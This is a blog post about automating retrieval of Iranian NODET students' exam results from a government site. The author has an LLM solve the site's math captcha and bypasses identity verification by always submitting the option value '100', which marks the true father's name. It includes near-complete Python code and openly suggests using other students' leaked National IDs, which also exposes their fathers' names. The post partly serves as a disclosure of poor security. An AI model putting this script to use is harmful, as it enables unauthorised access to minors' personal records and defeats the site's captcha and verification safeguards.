---
title: Automatic fetching of Payesh results
layout: posts.liquid
is_draft: false
published_date: 2025-02-10 11:30:00 +0330
description: Tinkering around with Gemini and solving Captchas
categories: ['Technology', 'AI', 'Web Development']
---
### Intro
In [NODET](https://en.wikipedia.org/wiki/National_Organization_for_Development_of_Exceptional_Talents) schools, two rounds of an exam called "Samapad Monitoring (Payesh) Exam" are held for students each academic year. The monitoring exam, also known as the Academic Performance Monitoring Test, is conducted to assess the academic performance of the students.

The exam for this year was held on Bahman 10th, and the results were released on Bahman 17th. You can find extra info about the exam on [The offical website](https://payesh.sampad.gov.ir/).

The results are viewable on the [Karnameh](https://karnameh.sampad.gov.ir/) website.

### First (login) page
<figure>
  <img alt="Screenshot of the website" src="/public/images/payesh-karnameh-website/karnameh-website-screenshot.png" style="max-height: 700px !important;"/>
  <figcaption>The inital login page, showing the sampad logo, asking for your National ID and a Math problem as the captcha solution.</figcaption>
</figure>
  
On closer inspection, the website appears to built with little care, and it was unresposive at the time of release (as expected for most Iranian offical websites). The websites appears to be built using ASP.NET and hosted on a Windows Server with Firewalls, one can only hope they configured it safetly, but that is out of the current topic. 

This page as well as the subsequent pages are littered with the ASP.NET's `__VIEWSTATE` hidden inputs. I have not looked into the data they contain, but they may contain interesting data.

The page requests a valid National ID and the numerical solution to the calculation to redirect you to the next page and the next step, obviously if the National ID is wrong or the solution is incorrect, you will get redirected here. 

So..., say you had someone's National ID, many students National IDs ;D
Doing these steps manually to view or save the results is cumbersome and time consuming, so why don't we automate that?

```python
login_page = BeautifulSoup(session.get('https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx', headers=headers).text, "html.parser")
params = {input_el['name']: input_el.get('value') for input_el in login_page.find_all('input')}
captcha_text = login_page.find('span', id='lmsg').text
```

To begin we will send a request to the login page, parse the response html with `bs4` and collect all the input parameters and the catpcha text.

So now we need to solve the captcha. If I was doing this 2 or 3 years ago, I would have said: 

> Let's build a NLP solution to convert the problem from language to a mathmatical expression and solve that.

but they say today is the age of AI, blah, blah, ... So let's throw a LLM at it. 

Google has made their `gemini-2.0-flash-lite-preview-02-05` model free for everyone to use, even with a free API key. And by everyone I mean every person who isn't doomed to live in Iran :D 

Because of sanctions I cannot use the Google AI Studio APIs, but need not worry! as useless and blood sucking Iranian companies are here to make profit out of that!

Anyway, I am going to use [AvalAI](https://avalai.ir/), they provide the free services too, you just have to trust them with your identity and we know how that goes with Iran. 

Thankfully they use OpenAI's api and not their own cryptic and useless APIs unlike other companies. So here is the function to solve the captcha: 

```python
BASE_URL = "https://api.avalai.ir/v1" # THANKS TO AVALAI FOR FREE API

client = OpenAI(
    api_key=API_KEY,
    base_url=BASE_URL,
)

def solve_captcha(captcha: str) -> int:
    chat_completion = client.chat.completions.create(
        messages=[
            {
                "role": "system",
                "content": "تو یک مدل هوش مصنوعی، مخصوص حل مسائل ریاضی هستی و با دقت تمام و با رعایت ترتیب عملگرد ها، ابتدا سوال را متوجه شده و پس از محاسبه پاسخ می دهی. مسائله ای که کاربر به تو ارسال می کند را حل کن  و فقط پاسخ نهایی را به شکل یک عدد بده."
            },
            {
                "role": "user",
                "content": captcha,
            }
        ],
        model="gemini-2.0-flash-lite-preview-02-05"
    )

    return int(chat_completion.choices[0].message.content.strip())
```


I have given it a Persian system prompt, so it doesn't get surprised when met with the actual problem. 
Here is the prompt: 

> "You are an artificial intelligence model specifically designed to solve mathematical problems. You understand the question with complete accuracy and follow the order of operations, then calculate and provide the answer. Solve the problem that the user sends you and give only the final answer as a number."

You may cry and say, why didn't you set the `temperature` to `0.0`, why don't you use function calling, json schema, `langchain`, `pydantic` ...

This is just a simple script. I have tested it for 100 instances and it works, so shut up.

```python
captcha_solution = solve_captcha(captcha_text)
logger.info(f'Captcha solution: {captcha_solution}')

params['txtUserName'] = NATIONAL_ID
params['txtPassword'] = captcha_solution # LOL What a joke

verification_page = BeautifulSoup(session.post('https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx', headers=headers, data=params).text, "html.parser")
```

After that we just solve the captcha, fill in the needed params and send a request to proceed to the next step.

### Second (verfication) page

So after all that, we arrive at the next step. In this step you have to choose the **father name** for the specified National ID to verify that you are trusted to view the results.

I am not going to go in much detail about how **STUPID** this way of verification is. You would expect for *Organization for Development of Exceptional Talents* there would be a better verificaiton system! 

The first strategy that came to my mind way to just keep repeating the request to the page, record a list of sets of the seen father names and take intersections until there is only one name left. This is hilariously simple. 

But you know what is more **hilarious (frustrating)**? 

If you just insepct the page, here is a sample of the list: 

```html
<tbody><tr>
		<td><input id="rName_0" type="radio" name="rName" value="100"><label for="rName_0">[REDACTED TRUE NAME]</label></td>
	</tr><tr>
		<td><input id="rName_1" type="radio" name="rName" value="11"><label for="rName_1">[REDACTED NAME]</label></td>
	</tr><tr>
		<td><input id="rName_2" type="radio" name="rName" value="14"><label for="rName_2">[REDACTED NAME]</label></td>
	</tr><tr>
		<td><input id="rName_3" type="radio" name="rName" value="7"><label for="rName_3">[REDACTED NAME]</label></td>
	</tr><tr>
		<td><input id="rName_4" type="radio" name="rName" value="21"><label for="rName_4">[REDACTED NAME]</label></td>
	</tr><tr>
		<td><input id="rName_5" type="radio" name="rName" value="34"><label for="rName_5">[REDACTED NAME]</label></td>
	</tr>
</tbody>
```

If you retry this a couple of times, you will see that the true name's ID is just always `100`!

This is just so wrong on many levels. These people trusted you with their sensitive credentials and this is how you treat them. 

Using this, not only you can view the results with only the National ID, you can even find the person's father name!

Other viewers outside Iran might not understand this, but our National IDs are just floating around in so many leaks, you can check for yourself on [leakfa](https://leakfa.com).

So to by pass this step you only need to send a `100` as the selected father name. What a joke.

```python
params = {input_el['name']: input_el.get('value') for input_el in verification_page.find_all('input')}
params['rName'] = '100' # WHAT A JOKE

session.post('https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx', headers=headers, data=params)
results_page = session.get('https://karnameh.sampad.gov.ir/karnameh/stdKarnameh.aspx', headers=headers).text
results_page = results_page.replace('../', 'https://karnameh.sampad.gov.ir/')
```

After that we fetch the results and save them or view them. 

The state of web development and security in Iran is very concerning.